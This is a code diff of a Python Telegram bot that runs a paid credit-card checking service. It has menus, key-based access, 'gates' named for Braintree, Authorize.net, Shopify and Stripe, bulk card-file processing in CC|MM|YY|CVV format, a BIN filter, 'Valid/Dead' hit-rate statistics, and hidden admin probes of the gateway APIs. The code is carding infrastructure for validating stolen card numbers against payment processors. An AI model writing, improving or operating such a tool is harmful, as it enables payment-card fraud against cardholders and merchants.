-    rows = []
-    row = []
-    for key, label, live in GATE_REGISTRY:
-        enabled = is_gate_enabled(key)
-        if not live:
-            icon = "🔜"
-        elif enabled:
-            icon = "🟢"
-        else:
-            icon = "🔴"
-        row.append((f"{icon} {label}", f"gate:{key}"))
-        if len(row) == 2:
-            rows.append(row)
-            row = []
-    if row:
-        rows.append(row)
-    rows.append([("◀️ Back", "menu:main")])
-    return {"inline_keyboard": rows}
-
-
-def gate_detail_kb(gate_key):
-    return kb(
-        [("📝 How to use", f"gate_help:{gate_key}")],
-        [("◀️ Back", "menu:gates")],
-    )
-
-
-def tools_menu_kb():
-    return kb(
-        [("🎯 Set BIN Filter", "tool:bin_info"), ("🗑 Clear BIN", "tool:clearbin")],
-        [("⛔ Cancel Task", "tool:cancel")],
-        [("◀️ Back", "menu:main")],
-    )
-
-
-def admin_menu_kb():
-    return kb(
-        [("🔑 Generate Key", "admin:genkey_info"), ("📋 Auth List", "admin:authlist")],
-        [("🛡️ Health Check", "admin:chkapis"), ("📢 Broadcast", "admin:broadcast_info")],
-        [("👑 Admin List", "admin:adminlist"), ("🚫 Revoke User", "admin:revoke_info")],
-        [("◀️ Back", "menu:main")],
-    )
-
-
-def back_main_kb():
-    return kb([("◀️ Back", "menu:main")])
-
-
-def back_admin_kb():
-    return kb([("◀️ Back", "menu:admin")])
-
-
-def back_gates_kb():
-    return kb([("◀️ Back", "menu:gates")])
-
-
-def stop_button_markup(user_id):
-    return {"inline_keyboard": [[{"text": "⛔ Stop", "callback_data": f"stop_{user_id}"}]]}
-
-
-# ============================================================
-#  Message Formatters — Clean, minimal, premium
-# ============================================================
-
-def fmt_welcome(username, user_id, is_adm=False):
-    name_display = f"@{username}" if username else f"User"
-    role = "👑 Admin" if is_adm else "👤 Member"
-    return (
-        f"<b>Welcome, {name_display}</b>\n\n"
-        f"ID  <code>{user_id}</code>\n"
-        f"Role  {role}\n\n"
-        f"Select an option below to get started."
-    )
-
-
-def fmt_gates_menu():
-    lines = ["<b>🔍 Available Gates</b>\n"]
-    gs = load_gate_stats()
-    for key, label, live in GATE_REGISTRY:
-        enabled = is_gate_enabled(key)
-        if not live:
-            status = "🔜 Coming Soon"
-        elif enabled:
-            s = gs.get(key, {})
-            total = s.get("total", 0)
-            approved = s.get("approved", 0)
-            rate = f"{(approved/total*100):.0f}%" if total > 0 else "—"
-            status = f"🟢 Online  ·  {rate} hit rate"
-        else:
-            status = "🔴 Offline"
-        lines.append(f"<b>{label}</b>\n{status}\n")
-    lines.append("Tap a gate to see details.")
-    return "\n".join(lines)
-
-
-def fmt_gate_detail(gate_key):
-    info = dict((k, l) for k, l, _ in GATE_REGISTRY)
-    label = info.get(gate_key, gate_key)
-    enabled = is_gate_enabled(gate_key)
-    gs = load_gate_stats()
-    s = gs.get(gate_key, {})
-    total = s.get("total", 0)
-    approved = s.get("approved", 0)
-    rate = f"{(approved/total*100):.1f}%" if total > 0 else "—"
-
-    status_icon = "🟢 Online" if enabled else "🔴 Offline"
-
-    return (
-        f"<b>{label}</b>\n\n"
-        f"Status  {status_icon}\n"
-        f"Processed  <code>{total:,}</code>\n"
-        f"Hit Rate  <code>{rate}</code>\n\n"
-        f"<b>Usage:</b>\n"
-        f"  Single → <code>/{gate_key} CC|MM|YY|CVV</code>\n"
-        f"  Bulk → Send .txt, reply with <code>/{gate_key}</code>"
-    )
-
-
-def fmt_stats_menu(user_id):
-    stats = load_stats()
-    s = stats.get(str(user_id))
-    if not s:
-        return (
-            "<b>📊 Your Stats</b>\n\n"
-            "No sessions yet.\n"
-            "Run a gate to start tracking."
+        base += (
+            "<b>Admin:</b>\n"
+            "  /genkey     — Generate single key\n"
+            "  /genkeys    — Bulk generate keys\n"
+            "  /adminkey   — Promote user to admin\n"
+            "  /adminlist  — List all admins\n"
+            "  /authlist   — List authorized users\n"
+            "  /revoke     — Revoke user access\n"
+            "  /broadcast  — Message all users\n"
+            "  /chkapis    — Health check all APIs\n\n"
         )
 
-    total = s.get('total', 0)
-    approved = s.get('approved', 0)
-    rate = f"{(approved/total*100):.1f}%" if total > 0 else "—"
-
-    return (
-        "<b>📊 Your Stats</b>\n\n"
-        f"Sessions  <code>{s.get('sessions', 0)}</code>\n"
-        f"Processed  <code>{total:,}</code>\n"
-        f"Approved  <code>{approved:,}</code>\n"
-        f"Declined  <code>{s.get('declined', 0):,}</code>\n"
-        f"Skipped  <code>{s.get('skipped', 0):,}</code>\n"
-        f"Errors  <code>{s.get('errors', 0):,}</code>\n\n"
-        f"Hit Rate  <code>{rate}</code>"
+    base += (
+        "<b>How to use:</b>\n"
+        "  <b>Single:</b> <code>/auth 4111...|01|25|123</code>\n"
+        "  <b>Bulk:</b> Send .txt → reply with /auth\n"
+        "  <b>Braintree:</b> <code>/b3 4111...|01|25|123</code>\n"
+        "  <b>Authorize:</b> <code>/authnet 4111...|01|2025|123</code>\n"
+        "  <b>Shopify:</b> <code>/autosho 4111...|01|25|123</code>\n"
+        f"{FOOTER}"
     )
-
-
-def fmt_mykey_menu(user_id):
-    users = load_users()
-    entry = users.get(str(user_id))
-    if not entry:
-        return (
-            "<b>🔑 Key Info</b>\n\n"
-            "No key redeemed.\n"
-            "Use <code>/redeem YOUR-KEY</code> to activate."
-        )
-
-    key = entry.get("key", "N/A")
-    redeemed = datetime.fromtimestamp(entry.get("redeemed_at", 0)).strftime("%Y-%m-%d %H:%M UTC")
-    expires_at = entry.get("expires_at")
-    if expires_at is None:
-        exp_text = "Never"
-    else:
-        exp_text = datetime.fromtimestamp(expires_at).strftime("%Y-%m-%d %H:%M UTC")
-        if time.time() > expires_at:
-            exp_text += "  ⚠️ Expired"
-
-    ll = entry.get("line_limit")
-    limit_text = str(ll) if ll else "Unlimited"
-
-    return (
-        "<b>🔑 Key Info</b>\n\n"
-        f"Key  <code>{key}</code>\n"
-        f"Redeemed  <code>{redeemed}</code>\n"
-        f"Expires  <code>{exp_text}</code>\n"
-        f"Line Limit  <code>{limit_text}</code>"
-    )
-
-
-def fmt_tools_menu():
-    return (
-        "<b>⚙️ Tools</b>\n\n"
-        "<b>🎯 BIN Filter</b>\n"
-        "Filter cards by BIN prefix during bulk processing.\n"
-        "Command: <code>/bin 424242,555555</code>\n\n"
-        "<b>⛔ Cancel</b>\n"
-        "Stop your active processing task."
-    )
+    return base
 
 
 def fmt_unauthorized():
     return (
-        "<b>🔒 Access Required</b>\n\n"
-        "You need a key to use this feature.\n"
-        "Use <code>/redeem YOUR-KEY</code> to activate."
+        "<b>Access Denied</b>\n\n"
+        "You need to redeem a key first.\n"
+        "Use: <code>/redeem YOUR-KEY</code>\n"
+        f"{FOOTER}"
     )
 
 
 def fmt_live(idx, total, results, start_time, entry="", status_text="", done=False):
-    title = "✅ Complete" if done else "⚡ Processing"
+    title = "Engine Complete" if done else "Engine Active"
 
     elapsed = time.time() - start_time
     cpm = int((idx / elapsed) * 60) if elapsed > 0 else 0
@@ -1621,35 +1592,95 @@ def fmt_live(idx, total, results, start_time, entry="", status_text="", done=Fal
 
     return (
         f"<b>{title}</b>\n\n"
-        f"<code>{bar}</code>  {pct}%\n\n"
-        f"Progress  <code>{idx}/{total}</code>\n"
-        f"Speed  <code>{cpm} CPM</code>\n"
-        f"ETA  <code>{eta}s</code>\n\n"
-        f"✅ <code>{results['approved']}</code>  "
-        f"❌ <code>{results['declined']}</code>  "
-        f"⏭ <code>{results['skipped']}</code>  "
-        f"⚠️ <code>{results['errors']}</code>"
+        f"<code>{bar}</code> {pct}%\n\n"
+        f"Loaded: <code>{total}</code>\n"
+        f"Progress: <code>{idx}/{total}</code>\n"
+        f"Speed: <code>{cpm} CPM</code>\n"
+        f"ETA: <code>{eta}s</code>\n\n"
+        f"Current:\n<code>{entry}</code>\n\n"
+        f"Status:\n{status_text}\n\n"
+        f"Valid: <code>{results['approved']}</code>\n"
+        f"Dead: <code>{results['declined']}</code>\n"
+        f"Skipped: <code>{results['skipped']}</code>\n"
+        f"Issues: <code>{results['errors']}</code>\n"
     )
 
 
 def fmt_results(results):
-    total = results['total']
-    approved = results['approved']
-    rate = f"{(approved/total*100):.1f}%" if total > 0 else "—"
+    return (
+        "<b>Session Complete</b>\n\n"
+        f"Total: {results['total']}\n"
+        f"Approved: {results['approved']}\n"
+        f"Declined: {results['declined']}\n"
+        f"Skipped: {results['skipped']}\n"
+        f"Errors: {results['errors']}\n"
+        + FOOTER
+    )
+
+
+def fmt_stats(user_id):
+    stats = load_stats()
+    uid = str(user_id)
+    s = stats.get(uid)
+    if not s:
+        return f"<b>No Stats</b>\n\nYou haven't run any sessions yet.{FOOTER}"
 
     return (
-        "<b>📋 Session Complete</b>\n\n"
-        f"Total  <code>{total}</code>\n"
-        f"Approved  <code>{approved}</code>\n"
-        f"Declined  <code>{results['declined']}</code>\n"
-        f"Skipped  <code>{results['skipped']}</code>\n"
-        f"Errors  <code>{results['errors']}</code>\n\n"
-        f"Hit Rate  <code>{rate}</code>"
+        "<b>Your Lifetime Stats</b>\n"
+        f"{'─' * 28}\n\n"
+        f"Sessions: <code>{s.get('sessions', 0)}</code>\n"
+        f"Total Processed: <code>{s.get('total', 0)}</code>\n"
+        f"Approved: <code>{s.get('approved', 0)}</code>\n"
+        f"Declined: <code>{s.get('declined', 0)}</code>\n"
+        f"Skipped: <code>{s.get('skipped', 0)}</code>\n"
+        f"Errors: <code>{s.get('errors', 0)}</code>\n"
+        + FOOTER
+    )
+
+
+def fmt_mykey(user_id):
+    users = load_users()
+    entry = users.get(str(user_id))
+    if not entry:
+        return f"<b>No Key</b>\n\nYou haven't redeemed a key.{FOOTER}"
+
+    key = entry.get("key", "N/A")
+    redeemed = datetime.fromtimestamp(entry.get("redeemed_at", 0)).strftime("%Y-%m-%d %H:%M UTC")
+    expires_at = entry.get("expires_at")
+    if expires_at is None:
+        exp_text = "Never (Permanent)"
+    else:
+        exp_text = datetime.fromtimestamp(expires_at).strftime("%Y-%m-%d %H:%M UTC")
+        if time.time() > expires_at:
+            exp_text += " (EXPIRED)"
+
+    ll = entry.get("line_limit")
+    limit_text = str(ll) if ll else "Unlimited"
+
+    return (
+        "<b>Your Key Info</b>\n"
+        f"{'─' * 28}\n\n"
+        f"Key: <code>{key}</code>\n"
+        f"Redeemed: <code>{redeemed}</code>\n"
+        f"Expires: <code>{exp_text}</code>\n"
+        f"Line Limit: <code>{limit_text}</code>\n"
+        + FOOTER
     )
 
 
 # ============================================================
-#  Active processing tracker
+#  Inline keyboard helpers
+# ============================================================
+def stop_button_markup(user_id):
+    return {
+        "inline_keyboard": [[
+            {"text": "Stop", "callback_data": f"stop_{user_id}"}
+        ]]
+    }
+
+
+# ============================================================
+#  Active processing tracker (one per user)
 # ============================================================
 active_users = set()
 user_bins = {}
@@ -1658,7 +1689,7 @@ cancel_flags = {}
 
 
 # ============================================================
-#  Callback handler — Menu navigation + actions
+#  Command handlers
 # ============================================================
 def handle_callback(update):
     cb = update.get("callback_query")
@@ -1667,279 +1698,54 @@ def handle_callback(update):
 
     data = cb.get("data", "")
     cb_user_id = cb["from"]["id"]
-    cb_username = cb["from"].get("username", "")
     cb_id = cb["id"]
-    chat_id = cb.get("message", {}).get("chat", {}).get("id")
-    msg_id = cb.get("message", {}).get("message_id")
 
-    if not chat_id or not msg_id:
-        answer_callback(cb_id)
-        return
-
-    adm = is_admin(cb_user_id)
-
-    # --- Stop button ---
     if data.startswith("stop_"):
         target_uid = int(data.split("_", 1)[1])
-        if cb_user_id == target_uid or adm:
+        if cb_user_id == target_uid or is_admin(cb_user_id):
             cancel_flags[target_uid] = True
-            answer_callback(cb_id, "Stopping...")
+            answer_callback(cb_id, "Stopping task...")
         else:
             answer_callback(cb_id, "Not your task.")
-        return
 
-    # --- Menu navigation ---
-    if data == "menu:main":
-        edit_message(chat_id, msg_id, fmt_welcome(cb_username, cb_user_id, adm), reply_markup=main_menu_kb(adm))
-        answer_callback(cb_id)
-        return
-
-    if data == "menu:gates":
-        edit_message(chat_id, msg_id, fmt_gates_menu(), reply_markup=gates_menu_kb())
-        answer_callback(cb_id)
-        return
-
-    if data == "menu:stats":
-        edit_message(chat_id, msg_id, fmt_stats_menu(cb_user_id), reply_markup=back_main_kb())
-        answer_callback(cb_id)
-        return
-
-    if data == "menu:mykey":
-        edit_message(chat_id, msg_id, fmt_mykey_menu(cb_user_id), reply_markup=back_main_kb())
-        answer_callback(cb_id)
-        return
-
-    if data == "menu:tools":
-        edit_message(chat_id, msg_id, fmt_tools_menu(), reply_markup=tools_menu_kb())
-        answer_callback(cb_id)
-        return
-
-    if data == "menu:admin":
-        if not adm:
-            answer_callback(cb_id, "Admin only.")
-            return
-        edit_message(chat_id, msg_id,
-            "<b>👑 Admin Panel</b>\n\n"
-            "Select an action below.",
-            reply_markup=admin_menu_kb())
-        answer_callback(cb_id)
-        return
-
-    # --- Gate detail ---
-    if data.startswith("gate:"):
-        gate_key = data.split(":", 1)[1]
-        info = dict((k, l) for k, l, _ in GATE_REGISTRY)
-        if gate_key not in info:
-            answer_callback(cb_id, "Unknown gate.")
-            return
-        edit_message(chat_id, msg_id, fmt_gate_detail(gate_key), reply_markup=gate_detail_kb(gate_key))
-        answer_callback(cb_id)
-        return
-
-    if data.startswith("gate_help:"):
-        gate_key = data.split(":", 1)[1]
-        info = dict((k, l) for k, l, _ in GATE_REGISTRY)
-        label = info.get(gate_key, gate_key)
-        cmd = f"/{gate_key}" if gate_key != "auth" else "/auth"
-        edit_message(chat_id, msg_id,
-            f"<b>📝 {label} — Usage</b>\n\n"
-            f"<b>Single check:</b>\n"
-            f"<code>{cmd} 4111111111111111|01|25|123</code>\n\n"
-            f"<b>Bulk check:</b>\n"
-            f"1. Upload a <code>.txt</code> file with cards\n"
-            f"   (one per line: <code>CC|MM|YY|CVV</code>)\n"
-            f"2. Reply to the file with <code>{cmd}</code>",
-            reply_markup=back_gates_kb())
-        answer_callback(cb_id)
-        return
-
-    # --- Tool actions ---
-    if data == "tool:bin_info":
-        edit_message(chat_id, msg_id,
-            "<b>🎯 BIN Filter</b>\n\n"
-            "Send a command to set your BIN filter:\n"
-            "<code>/bin 424242,555555</code>\n\n"
-            "Only cards matching these prefixes will be processed.",
-            reply_markup=tools_menu_kb())
-        answer_callback(cb_id)
-        return
-
-    if data == "tool:clearbin":
-        if cb_user_id in user_bins:
-            del user_bins[cb_user_id]
-            answer_callback(cb_id, "BIN filter cleared.")
-        else:
-            answer_callback(cb_id, "No BIN filter active.")
-        edit_message(chat_id, msg_id, fmt_tools_menu(), reply_markup=tools_menu_kb())
-        return
-
-    if data == "tool:cancel":
-        if cb_user_id in active_users:
-            cancel_flags[cb_user_id] = True
-            answer_callback(cb_id, "Stopping your task...")
-        else:
-            answer_callback(cb_id, "No active task.")
-        return
-
-    # --- Admin actions ---
-    if data == "admin:genkey_info":
-        if not adm:
-            answer_callback(cb_id, "Admin only.")
-            return
-        edit_message(chat_id, msg_id,
-            "<b>🔑 Generate Key</b>\n\n"
-            "<b>Single:</b>\n<code>/genkey [limit] [duration]</code>\n\n"
-            "<b>Bulk:</b>\n<code>/genkeys 10 500 7d</code>\n\n"
-            "<b>Examples:</b>\n"
-            "<code>/genkey</code> — unlimited, permanent\n"
-            "<code>/genkey 500 7d</code> — 500 lines, 7 days\n"
-            "<code>/genkeys 20 1000 30d</code> — 20 keys",
-            reply_markup=back_admin_kb())
-        answer_callback(cb_id)
-        return
-
-    if data == "admin:authlist":
-        if not adm:
-            answer_callback(cb_id, "Admin only.")
-            return
-        users = load_users()
-        if not users:
-            edit_message(chat_id, msg_id, "<b>📋 Authorized Users</b>\n\nNone.", reply_markup=back_admin_kb())
-            answer_callback(cb_id)
-            return
-        lines = []
-        now = time.time()
-        for uid, entry in users.items():
-            key = entry.get("key", "N/A")
-            expires_at = entry.get("expires_at")
-            if expires_at is None:
-                exp = "Perm"
-            elif now > expires_at:
-                exp = "Expired"
-            else:
-                remaining = int(expires_at - now)
-                exp = fmt_duration(remaining)
-            lines.append(f"<code>{uid}</code>  {key[:10]}…  {exp}")
-        edit_message(chat_id, msg_id,
-            f"<b>📋 Authorized Users ({len(users)})</b>\n\n" + "\n".join(lines),
-            reply_markup=back_admin_kb())
-        answer_callback(cb_id)
-        return
-
-    if data == "admin:adminlist":
-        if not adm:
-            answer_callback(cb_id, "Admin only.")
-            return
-        admins = _load_json(ADMINS_FILE, {})
-        lines = []
-        now = time.time()
-        for oid in ADMIN_IDS:
-            lines.append(f"<code>{oid}</code>  Owner")
-        for uid, entry in admins.items():
-            expires_at = entry.get("expires_at")
-            if expires_at is None:
-                exp = "Perm"
-            elif now > expires_at:
-                exp = "Expired"
-            else:
-                exp = fmt_duration(int(expires_at - now))
-            lines.append(f"<code>{uid}</code>  {exp}")
-        edit_message(chat_id, msg_id,
-            f"<b>👑 Admins ({len(lines)})</b>\n\n" + "\n".join(lines),
-            reply_markup=back_admin_kb())
-        answer_callback(cb_id)
-        return
-
-    if data == "admin:chkapis":
-        if not adm:
-            answer_callback(cb_id, "Admin only.")
-            return
-        answer_callback(cb_id, "Checking all gates...")
-        edit_message(chat_id, msg_id, "<b>🛡️ Probing all gates...</b>\n\nThis may take a moment.")
-
-        lines = ["<b>🛡️ Health Report</b>\n"]
-        for gate_key, info in GATE_PROBE_MAP.items():
-            alive, latency, detail = probe_gate(gate_key)
-            enabled = is_gate_enabled(gate_key)
-            icon = "🟢" if alive else "🔴"
-            en = "On" if enabled else "Off"
-            status = f"{latency}ms" if alive else detail[:40]
-            lines.append(f"{icon} <b>{info['name']}</b>\n   {status}  ·  {en}")
-
-        # Build toggle buttons for each gate
-        toggle_rows = []
-        row = []
-        for gate_key, info in GATE_PROBE_MAP.items():
-            enabled = is_gate_enabled(gate_key)
-            if enabled:
-                row.append((f"🔴 {gate_key}", f"gate_off_{gate_key}"))
-            else:
-                row.append((f"🟢 {gate_key}", f"gate_on_{gate_key}"))
-            if len(row) == 3:
-                toggle_rows.append(row)
-                row = []
-        if row:
-            toggle_rows.append(row)
-        toggle_rows.append([("◀️ Back", "menu:admin")])
-
-        edit_message(chat_id, msg_id, "\n".join(lines),
-            reply_markup={"inline_keyboard": [[{"text": t, "callback_data": d} for t, d in r] for r in toggle_rows]})
-        return
-
-    if data == "admin:broadcast_info":
-        if not adm:
-            answer_callback(cb_id, "Admin only.")
-            return
-        edit_message(chat_id, msg_id,
-            "<b>📢 Broadcast</b>\n\n"
-            "Send a message to all authorized users:\n"
-            "<code>/broadcast Your message here</code>",
-            reply_markup=back_admin_kb())
-        answer_callback(cb_id)
-        return
-
-    if data == "admin:revoke_info":
-        if not adm:
-            answer_callback(cb_id, "Admin only.")
-            return
-        edit_message(chat_id, msg_id,
-            "<b>🚫 Revoke Access</b>\n\n"
-            "Remove a user's authorization:\n"
-            "<code>/revoke 123456789</code>",
-            reply_markup=back_admin_kb())
-        answer_callback(cb_id)
-        return
-
-    # --- Gate toggle callbacks ---
-    if data.startswith("gate_off_"):
-        if not adm:
+    # Gate disable/enable confirmation callbacks
+    elif data.startswith("gate_off_"):
+        if not is_admin(cb_user_id):
             answer_callback(cb_id, "Admin only.")
             return
         gate_key = data.replace("gate_off_", "")
         set_gate_enabled(gate_key, False, by_user=cb_user_id)
         gate_name = GATE_PROBE_MAP.get(gate_key, {}).get("name", gate_key)
-        answer_callback(cb_id, f"🔴 {gate_name} disabled")
-        # Refresh health panel
-        handle_callback({"callback_query": {**cb, "data": "admin:chkapis"}})
-        return
+        answer_callback(cb_id, f"🔴 {gate_name} disabled!")
+        chat_id = cb.get("message", {}).get("chat", {}).get("id")
+        if chat_id:
+            edit_message(chat_id, cb["message"]["message_id"],
+                f"<b>🔴 {gate_name} — DISABLED</b>\n\n"
+                f"Gate has been turned off. Users cannot use it.\n"
+                f"Use the check command again to re-enable." + FOOTER)
 
-    if data.startswith("gate_on_"):
-        if not adm:
+    elif data.startswith("gate_on_"):
+        if not is_admin(cb_user_id):
             answer_callback(cb_id, "Admin only.")
             return
         gate_key = data.replace("gate_on_", "")
         set_gate_enabled(gate_key, True, by_user=cb_user_id)
         gate_name = GATE_PROBE_MAP.get(gate_key, {}).get("name", gate_key)
-        answer_callback(cb_id, f"🟢 {gate_name} enabled")
-        handle_callback({"callback_query": {**cb, "data": "admin:chkapis"}})
-        return
+        answer_callback(cb_id, f"🟢 {gate_name} enabled!")
+        chat_id = cb.get("message", {}).get("chat", {}).get("id")
+        if chat_id:
+            edit_message(chat_id, cb["message"]["message_id"],
+                f"<b>🟢 {gate_name} — ENABLED</b>\n\n"
+                f"Gate is back online for all users." + FOOTER)
 
-    answer_callback(cb_id)
+    elif data == "gate_keep":
+        answer_callback(cb_id, "No changes made.")
+        chat_id = cb.get("message", {}).get("chat", {}).get("id")
+        if chat_id:
+            edit_message(chat_id, cb["message"]["message_id"],
+                "<b>No changes made.</b>" + FOOTER)
 
 
-# ============================================================
-#  Command handler
-# ============================================================
 def handle_update(update):
     if "callback_query" in update:
         handle_callback(update)
@@ -1951,91 +1757,67 @@ def handle_update(update):
 
     chat_id = msg["chat"]["id"]
     user_id = msg["from"]["id"]
-    username = msg["from"].get("username", "")
     text = (msg.get("text") or "").strip()
-
-    # --- /start and /help → Main menu ---
-    if text in ("/start", "/help"):
-        adm = is_admin(user_id)
-        send_message(chat_id, fmt_welcome(username, user_id, adm), reply_markup=main_menu_kb(adm))
-        return
 
     # --- /bin ---
     if text.startswith("/bin"):
         parts = text.split(maxsplit=1)
         if len(parts) < 2:
-            send_message(chat_id,
-                "<b>🎯 BIN Filter</b>\n\n"
-                "Usage: <code>/bin 424242,555555</code>",
-                reply_markup=back_main_kb())
+            send_message(chat_id, "<b>Usage:</b> /bin 424242,555555" + FOOTER)
             return
         bins = parts[1].replace(" ", "").split(",")
         user_bins[user_id] = bins
-        send_message(chat_id,
-            f"<b>🎯 BIN Filter Set</b>\n\n<code>{', '.join(bins)}</code>",
-            reply_markup=back_main_kb())
+        send_message(chat_id, f"<b>BIN filter set:</b>\n<code>{', '.join(bins)}</code>" + FOOTER)
         return
 
     # --- /clearbin ---
     if text == "/clearbin":
         if user_id in user_bins:
             del user_bins[user_id]
-            send_message(chat_id, "<b>BIN filter cleared.</b>", reply_markup=back_main_kb())
+            send_message(chat_id, "<b>BIN filter cleared.</b>" + FOOTER)
         else:
-            send_message(chat_id, "<b>No BIN filter active.</b>", reply_markup=back_main_kb())
+            send_message(chat_id, "<b>No BIN filter active.</b>" + FOOTER)
         return
 
     # --- /cancel ---
     if text == "/cancel":
         if user_id in active_users:
             cancel_flags[user_id] = True
-            send_message(chat_id, "<b>⛔ Stopping your task...</b>")
+            send_message(chat_id, "<b>Stopping your task...</b>" + FOOTER)
         else:
-            send_message(chat_id, "<b>No active task.</b>", reply_markup=back_main_kb())
+            send_message(chat_id, "<b>No active task.</b>" + FOOTER)
         return
 
-    # --- /stats ---
-    if text == "/stats":
-        send_message(chat_id, fmt_stats_menu(user_id), reply_markup=back_main_kb())
-        return
-
-    # --- /mykey ---
-    if text == "/mykey":
-        send_message(chat_id, fmt_mykey_menu(user_id), reply_markup=back_main_kb())
-        return
-
-    # --- /gates ---
-    if text == "/gates":
-        send_message(chat_id, fmt_gates_menu(), reply_markup=gates_menu_kb())
+    # --- /start ---
+    if text == "/start":
+        send_message(chat_id, fmt_start(is_adm=is_admin(user_id)))
         return
 
     # --- /lookup ---
     if text == "/lookup":
-        send_message(chat_id, "<b>🔎 Lookup</b>\n\nComing soon.", reply_markup=back_main_kb())
+        send_message(chat_id, f"<b>Lookup</b>\n\nComing soon.{FOOTER}")
         return
 
-    # --- /adminkey (owner only) ---
+    # (dead gates removed — no coming soon handler needed)
+
+    # --- /adminkey <user_id> <duration> (owner only) ---
     if text.startswith("/adminkey"):
         if int(user_id) not in ADMIN_IDS:
-            send_message(chat_id, "<b>Owner only.</b>")
+            send_message(chat_id, f"<b>Owner only.</b>{FOOTER}")
             return
         parts = text.split()
         if len(parts) < 2:
-            send_message(chat_id,
-                "<b>👑 Admin Key</b>\n\n"
-                "Usage: <code>/adminkey 123456789 7d</code>\n"
-                "Duration optional (default: permanent).",
-                reply_markup=back_main_kb())
+            send_message(chat_id, "<b>Usage:</b> <code>/adminkey 123456789 7d</code>\nDuration optional (default: permanent)." + FOOTER)
             return
         target_id = parts[1].strip()
         if not target_id.isdigit():
-            send_message(chat_id, "<b>Invalid user ID.</b>")
+            send_message(chat_id, "<b>Invalid user ID.</b>" + FOOTER)
             return
         duration_seconds = None
         if len(parts) >= 3:
             parsed = parse_duration(parts[2])
             if parsed == -1:
-                send_message(chat_id, "<b>Invalid duration.</b>\nExamples: 7d, 1mo, perm")
+                send_message(chat_id, "<b>Invalid duration.</b>\nExamples: 7d, 1mo, perm" + FOOTER)
                 return
             duration_seconds = parsed
         admins = _load_json(ADMINS_FILE, {})
@@ -2047,122 +1829,199 @@ def handle_update(update):
         admins[target_id] = entry
         _save_json(ADMINS_FILE, admins)
         dur_label = fmt_duration(duration_seconds) if duration_seconds else "Permanent"
-        send_message(chat_id,
-            f"<b>👑 Admin Granted</b>\n\n"
-            f"User  <code>{target_id}</code>\n"
-            f"Duration  <code>{dur_label}</code>",
-            reply_markup=back_main_kb())
+        send_message(chat_id, f"<b>Admin Granted</b>\n\nUser <code>{target_id}</code>\nDuration: <code>{dur_label}</code>{FOOTER}")
         return
 
-    # --- /adminlist ---
+    # --- /adminlist (owner only) ---
     if text == "/adminlist":
         if int(user_id) not in ADMIN_IDS:
-            send_message(chat_id, "<b>Owner only.</b>")
+            send_message(chat_id, f"<b>Owner only.</b>{FOOTER}")
             return
         admins = _load_json(ADMINS_FILE, {})
-        lines = []
+        lines_out = []
         now = time.time()
-        for oid in ADMIN_IDS:
-            lines.append(f"<code>{oid}</code>  Owner")
         for uid, entry in admins.items():
             expires_at = entry.get("expires_at")
             if expires_at is None:
-                exp = "Perm"
+                exp = "Permanent"
             elif now > expires_at:
-                exp = "Expired"
+                exp = "EXPIRED"
             else:
-                exp = fmt_duration(int(expires_at - now))
-            lines.append(f"<code>{uid}</code>  {exp}")
-        send_message(chat_id,
-            f"<b>👑 Admins ({len(lines)})</b>\n\n" + "\n".join(lines),
-            reply_markup=back_main_kb())
+                remaining = int(expires_at - now)
+                exp = fmt_duration(remaining) + " left"
+            lines_out.append(f"  {uid} | {exp}")
+        # Add hardcoded owner IDs
+        for oid in ADMIN_IDS:
+            lines_out.insert(0, f"  {oid} | Owner (permanent)")
+        msg_text = (
+            f"<b>Admins ({len(lines_out)})</b>\n"
+            f"{'─' * 28}\n\n"
+            "<code>" + "\n".join(lines_out) + "</code>"
+            + FOOTER
+        )
+        send_message(chat_id, msg_text)
         return
 
-    # --- /chkapi* ---
+    # --- /chkapi* — Admin-only secret API health checks ---
     chkapi_cmds = {
-        "/chkapiauth": "auth", "/chkapib3": "b3", "/chkapib3auth": "b3auth",
-        "/chkapiauthnet": "authnet", "/chkapiautosho": "autosho",
-        "/chkapist1": "st1", "/chkapist5": "st5",
+        "/chkapiauth": "auth",
+        "/chkapib3": "b3",
+        "/chkapib3auth": "b3auth",
+        "/chkapiauthnet": "authnet",
+        "/chkapiautosho": "autosho",
+        "/chkapist1": "st1",
+        "/chkapist5": "st5",
     }
     if text in chkapi_cmds:
         if not is_admin(user_id):
-            return
+            return  # Silent — secret command, don't reveal existence
         gate_key = chkapi_cmds[text]
         gate_info = GATE_PROBE_MAP.get(gate_key, {})
         gate_name = gate_info.get("name", gate_key)
+        currently_enabled = is_gate_enabled(gate_key)
 
-        resp = send_message(chat_id, f"<b>🔍 Probing {gate_name}...</b>")
-        probe_msg_id = resp.get("result", {}).get("message_id")
-
+        send_message(chat_id, f"<b>🔍 Probing {gate_name}...</b>")
         alive, latency, detail = probe_gate(gate_key)
-        enabled = is_gate_enabled(gate_key)
 
-        icon = "🟢" if alive else "🔴"
-        status = f"{latency}ms" if alive else detail
-
-        if alive and enabled:
-            btns = kb([("🔴 Disable", f"gate_off_{gate_key}"), ("✅ Keep", "menu:main")])
-        elif alive and not enabled:
-            btns = kb([("🟢 Enable", f"gate_on_{gate_key}"), ("◀️ Back", "menu:main")])
-        elif not alive and enabled:
-            btns = kb([("🔴 Disable", f"gate_off_{gate_key}"), ("⏳ Keep", "menu:main")])
+        if alive:
+            status_line = f"🟢 <b>ALIVE</b> — {latency}ms"
+            action_text = "Gate is working. Want to disable it?"
+            buttons = {"inline_keyboard": [[
+                {"text": "🔴 Disable", "callback_data": f"gate_off_{gate_key}"},
+                {"text": "✅ Keep", "callback_data": "gate_keep"},
+            ]]}
         else:
-            btns = kb([("🟢 Enable", f"gate_on_{gate_key}"), ("◀️ Back", "menu:main")])
+            status_line = f"🔴 <b>DEAD</b> — {detail}"
+            if currently_enabled:
+                action_text = "API is down. Disable this gate?"
+                buttons = {"inline_keyboard": [[
+                    {"text": "🔴 Yes, disable", "callback_data": f"gate_off_{gate_key}"},
+                    {"text": "⏳ Keep enabled", "callback_data": "gate_keep"},
+                ]]}
+            else:
+                action_text = "Gate is already disabled. Want to re-enable?"
+                buttons = {"inline_keyboard": [[
+                    {"text": "🟢 Re-enable", "callback_data": f"gate_on_{gate_key}"},
+                    {"text": "❌ Keep off", "callback_data": "gate_keep"},
+                ]]}
 
-        en_label = "On" if enabled else "Off"
-        if probe_msg_id:
-            edit_message(chat_id, probe_msg_id,
-                f"<b>{icon} {gate_name}</b>\n\n"
-                f"Status  {status}\n"
-                f"Detail  <code>{detail}</code>\n"
-                f"Gate  {en_label}",
-                reply_markup=btns)
+        enabled_label = "🟢 Enabled" if currently_enabled else "🔴 Disabled"
+        send_message(chat_id,
+            f"<b>API Check — {gate_name}</b>\n"
+            f"{'─' * 28}\n\n"
+            f"Status: {status_line}\n"
